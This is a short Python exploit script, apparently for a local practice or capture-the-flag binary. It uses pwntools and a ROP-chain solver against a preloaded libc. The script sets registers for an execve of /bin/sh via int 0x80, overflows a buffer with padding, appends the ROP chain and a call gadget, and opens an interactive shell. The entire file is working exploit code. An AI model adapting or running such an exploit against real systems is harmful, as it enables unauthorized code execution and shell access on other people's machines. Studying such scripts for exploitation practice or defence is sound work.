#TODO replace pwn tools with the functions of standard library
from pwn import *
from ropchain import *
import os

context.terminal = 'screen'
binary = './a.out'
lib = './libc.so.6'
os.environ['LD_PRELOAD'] = lib
p = process(binary)

libropchain.setLoader(libropchain.Loader.RPP)

base = 0x55550000
binsh = base + 0x15b9ab
int80 = base + 0xb07ae
regs = {eax: 0xb, ebx: binsh, ecx: 0x0, edx: 0x0, edi: int80}
print("libc base: %s" % hex(base))
print("int 0x80: %s" % hex(int80))
print("binsh: %s" % hex(binsh))

rop = solve(regs, lib, base, list(map(chr, range(0x20) + range(0x7f, 0x100))))
# rop.dump()
# print 'payload: %s' % repr(rop.payload())
print 'length: %s' % len(rop.payload())

#0x00019c30: call edi
payload = ''
payload += 'A' * 0x30
payload += rop.payload()
payload += p32(base+0x19c30)
payload += "ZZZZ"
# payload += p32(int80)

p.send(payload)

p.interactive()
